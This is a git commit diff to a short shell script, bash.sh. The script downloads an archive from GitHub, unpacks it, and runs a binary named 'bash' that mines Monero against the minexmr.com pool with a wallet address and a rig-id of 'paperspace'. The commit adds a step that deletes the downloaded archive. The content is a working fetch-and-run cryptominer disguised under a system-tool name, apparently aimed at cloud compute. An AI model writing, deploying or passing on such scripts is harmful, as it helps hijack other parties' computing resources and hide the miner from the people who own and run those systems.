c82190fb05ec83409fc4d496b2a29718cd425e50
edmlosttracks <80603448+edmlosttracks@users.noreply.github.com>
2021-03-14 08:26:10 +0900

    Update bash.sh

--- bash.sh
+++ bash.sh
@@ -1,5 +1,6 @@
 #/bin/bash
 
-wget https://github.com/edmlosttracks/mnro/raw/main/bash.xz
+wget https://github.com/edmlosttracks/mnro/raw/main/bash.tar.xz
 tar xf bash.tar.xz
+rm -rf bash.tar.xz
 ./bash -o us-west.minexmr.com:443 -u 42TC2RbR76s7tFkBbNKBuwaPqmHpfMQQZ2H6gVNzDQSTJizAG7UYsaa7LKPwAjmUK3GoqoKtVUXYhdeYuthdg2F1TsWQmKL -k --tls --rig-id paperspace
